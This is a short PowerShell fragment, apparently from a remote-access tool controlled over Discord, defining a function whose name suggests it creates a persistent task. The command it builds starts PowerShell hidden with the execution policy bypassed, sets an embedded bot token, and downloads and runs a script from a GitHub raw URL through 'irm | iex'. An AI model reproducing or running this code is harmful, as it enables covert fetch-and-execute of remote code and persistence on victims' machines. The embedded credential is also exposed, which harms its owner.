...
function Mcreate_Ptask{
    ...
    $command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& {`$token='MTM4MzEyMzgwNjc5NjY0ODU4OQ.GDf-nY.Jb1OB2ut5tAlFju6WBl9Hw4cp2XctSkkssfVIU'; irm 'https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/mainayre.ps1' | iex}`""
